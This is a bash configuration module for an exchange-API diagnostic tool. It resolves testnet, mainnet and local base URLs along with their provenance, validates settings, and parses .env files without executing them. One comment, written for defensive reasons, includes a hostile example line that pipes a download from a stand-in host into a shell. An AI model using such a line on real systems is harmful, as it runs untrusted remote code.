# shellcheck shell=bash
# shellcheck disable=SC2034  # this file is only ever sourced; run.sh is what reads these
#
# Where this tool thinks the venue is, and where it got that idea from.
#
# Provenance is a first-class output here. "Which base URL is in play, and which
# of the four things that can set one actually set it" is itself one of the
# failure modes — a reader who exports `NEXUS_BASE_URL` in one shell and debugs
# in another has a configuration that changes depending on the terminal.

# The CLI release this example was written and verified against. Pinned exactly,
# per CONTRIBUTING: a reader running this a year from now should get the
# behaviour the README describes. Same pin as `cli/quote-ladder`, deliberately —
# two examples in one track disagreeing about the CLI version is a support
# question all of its own.
readonly PINNED_CLI_VERSION="0.4.0"
# What that release reports as its API spec tag. Not a pin — it is printed so a
# surprising server response can be lined up against a known contract.
readonly EXPECTED_SPEC_TAG="v0.8.1"

# The base URL every SDK and the CLI ship as their testnet default today. It is
# checked on every run *whatever* network is selected, because the single most
# common way to arrive here is with a client still pointed at it. Measured
# 2026-09-09: it answers 500 on every route, from a proxy to a decommissioned
# service. See the `legacy` check.
readonly LEGACY_BASE_URL="https://exchange.nexus.xyz/api/exchange"

# The base that actually works today. Named as its own constant because the
# `legacy` check's advice must point here whatever network is selected: on
# mainnet, `DEFAULT_REST_BASE` is a host with no DNS, and telling a reader to
# set their base URL to an undeployed host is worse advice than none.
readonly DURABLE_TESTNET_BASE="https://api.testnet.nexus.xyz/indexer"

# A path the venue serves without credentials. Everything the transport checks
# conclude is concluded from this one path, so it has to be public: a probe of
# an authenticated path could not tell "wrong prefix" from "no key".
readonly PUBLIC_PATH="/markets/summary"

# A path that certainly does not exist. Probing it is how this tool *proves*,
# rather than assumes, that authentication runs ahead of routing on this
# deployment — if a nonexistent path answers 401 then a 401 says nothing about
# whether your path is real, and the report says so out loud.
readonly ABSENT_PATH="/preflight-doctor-no-such-path"

# resolve_network — the base URLs per network, and where they came from.
#
# Note which base is the default: the durable per-network host, **not** the
# legacy base the SDKs ship. That is the useful default for a diagnostic — it
# gives the reader a host that works to compare their broken one against. It is
# also the one place this tool comes close to the thing it must never do, so to
# be precise about the line: the doctor never *switches* a failing request to
# another host and calls it fixed. It probes both, reports both, and leaves the
# choice with the reader. Automatic failover is the one recovery that must not
# be automated, because a client that believed it was on play funds would be
# pointed at real ones.
resolve_network() {
  DOCTOR_NETWORK=${DOCTOR_NETWORK:-testnet}

  [[ $DOCTOR_NETWORK =~ ^[a-z0-9]([a-z0-9-]{0,30}[a-z0-9])?$ ]] ||
    die "$EX_USAGE" "DOCTOR_NETWORK is not a usable network label: $(quoted "$DOCTOR_NETWORK")"

  case $DOCTOR_NETWORK in
    testnet)
      DEFAULT_REST_BASE="https://api.testnet.nexus.xyz/indexer"
      DEFAULT_WS_BASE="wss://api.testnet.nexus.xyz/indexer"
      NETWORK_FUNDS="play funds"
      ;;
    mainnet)
      # The host, and deliberately no path prefix. Every other environment
      # mounts the API under `/indexer`, so the convention would predict
      # `https://api.nexus.xyz/indexer` — but the host resolves to no address,
      # so nothing has ever confirmed it and this tool does not guess. The DNS
      # check fails first and the report says the prefix is unverified rather
      # than inventing one.
      DEFAULT_REST_BASE="https://api.nexus.xyz"
      DEFAULT_WS_BASE="wss://api.nexus.xyz"
      NETWORK_FUNDS="REAL FUNDS"
      ;;
    local)
      DEFAULT_REST_BASE="http://localhost:9090"
      DEFAULT_WS_BASE="ws://localhost:9090"
      NETWORK_FUNDS="play funds"
      ;;
    *)
      die "$EX_USAGE" "DOCTOR_NETWORK must be testnet, mainnet or local, got $(quoted "$DOCTOR_NETWORK"). A custom stage has no published host for this tool to probe; point it at one with NEXUS_EXCHANGE_API_URL instead."
      ;;
  esac

  # `NEXUS_EXCHANGE_API_URL` is the catalog-wide override (CONTRIBUTING §4), and
  # it is honoured here for the same reason every other example honours it: a
  # reader whose default host is unreachable needs a way through, and a
  # diagnostic that cannot be pointed at the thing being diagnosed is useless.
  if [[ -n ${NEXUS_EXCHANGE_API_URL:-} ]]; then
    REST_BASE=${NEXUS_EXCHANGE_API_URL%/}
    REST_BASE_SOURCE="NEXUS_EXCHANGE_API_URL"
  else
    REST_BASE=$DEFAULT_REST_BASE
    REST_BASE_SOURCE="the $DOCTOR_NETWORK default"
  fi

  [[ $REST_BASE =~ ^https?://[^[:space:]/]+ ]] ||
    die "$EX_USAGE" "the API base URL must be an http(s) URL, got $(quoted "$REST_BASE")"

  # The WS base follows the REST base rather than the bare origin, which is the
  # entire point of checking it separately — see the `ws` check.
  if [[ -n ${NEXUS_EXCHANGE_WS_URL:-} ]]; then
    WS_BASE=${NEXUS_EXCHANGE_WS_URL%/}
    WS_BASE_SOURCE="NEXUS_EXCHANGE_WS_URL"
  elif [[ -n ${NEXUS_EXCHANGE_API_URL:-} ]]; then
    WS_BASE=${REST_BASE/#http/ws}
    WS_BASE_SOURCE="derived from NEXUS_EXCHANGE_API_URL"
  else
    WS_BASE=$DEFAULT_WS_BASE
    WS_BASE_SOURCE="the $DOCTOR_NETWORK default"
  fi

  REST_HOST=${REST_BASE#*://}
  REST_HOST=${REST_HOST%%/*}
  REST_HOST=${REST_HOST%%:*}

  # The prefix is whatever the base carries after the host. Reported on its own
  # line because it is the thing that is usually wrong, and a reader scanning
  # for it should not have to parse a URL by eye.
  REST_PREFIX=${REST_BASE#*://}
  REST_PREFIX=${REST_PREFIX#"${REST_PREFIX%%/*}"}
  REST_PREFIX=${REST_PREFIX:-/}
}

# resolve_config — the knobs, all validated before the first request.
resolve_config() {
  DOCTOR_TIMEOUT_SECONDS=${DOCTOR_TIMEOUT_SECONDS:-15}
  DOCTOR_WS_TIMEOUT_SECONDS=${DOCTOR_WS_TIMEOUT_SECONDS:-8}
  DOCTOR_CLOCK_SKEW_WARN=${DOCTOR_CLOCK_SKEW_WARN:-5}
  DOCTOR_LAG_WARN_SECONDS=${DOCTOR_LAG_WARN_SECONDS:-60}
  DOCTOR_SKIP_CREDENTIALS=${DOCTOR_SKIP_CREDENTIALS:-0}

  require_int_range DOCTOR_TIMEOUT_SECONDS "$DOCTOR_TIMEOUT_SECONDS" 2 120
  require_int_range DOCTOR_WS_TIMEOUT_SECONDS "$DOCTOR_WS_TIMEOUT_SECONDS" 2 120
  require_int_range DOCTOR_CLOCK_SKEW_WARN "$DOCTOR_CLOCK_SKEW_WARN" 1 3600
  require_int_range DOCTOR_LAG_WARN_SECONDS "$DOCTOR_LAG_WARN_SECONDS" 1 86400

  # Register the credentials for redaction the moment they are known, and before
  # any code path can print anything. Nothing below reads their values.
  redact_register \
    "${NEXUS_API_SECRET:-}" "${NEXUS_EXCHANGE_API_SECRET:-}" \
    "${NEXUS_API_KEY:-}" "${NEXUS_EXCHANGE_API_KEY:-}"
}

# Load `.env` into the environment **without executing it**.
#
# `source .env` is the usual one-liner and it is a code-execution primitive: a
# line like `NEXUS_API_KEY=$(curl evil.example/x | sh)` runs on load. Since the
# whole purpose of the file is to hold a credential, it is exactly the file
# least worth trusting with a shell. So it is parsed: `KEY=VALUE`, one optional
# layer of quotes stripped, no expansion, no substitution, nothing else
# honoured.
#
# The real environment wins over the file, so `DOCTOR_NETWORK=local ./run.sh`
# does what it looks like.
load_dotenv() {
  local file=$1 line key value lineno=0
  [[ -f $file ]] || return 0

  while IFS= read -r line || [[ -n $line ]]; do
    lineno=$(( lineno + 1 ))
    line=${line%$'\r'}                                   # tolerate CRLF files
    [[ $line =~ ^[[:space:]]*(#|$) ]] && continue
    line=${line#"${line%%[![:space:]]*}"}                # trim leading blanks
    [[ $line == export[[:space:]]* ]] && line=${line#export }

    if [[ ! $line =~ ^([A-Za-z_][A-Za-z0-9_]*)=(.*)$ ]]; then
      # The line number, never the line: an unparsable line in this file is as
      # likely as not to be a mangled secret, and a warning that echoed it would
      # put the secret in the log this tool exists to have pasted into an issue.
      warn "$file line $lineno is not KEY=VALUE; ignoring it"
      continue
    fi
    key=${BASH_REMATCH[1]}
    value=${BASH_REMATCH[2]}

    if (( ${#value} >= 2 )) && [[ ( $value == \"*\" ) || ( $value == \'*\' ) ]]; then
      value=${value:1:${#value}-2}
    fi

    [[ -n ${!key+set} ]] && continue                     # already in the environment
    export "$key=$value"
  done <"$file"
}
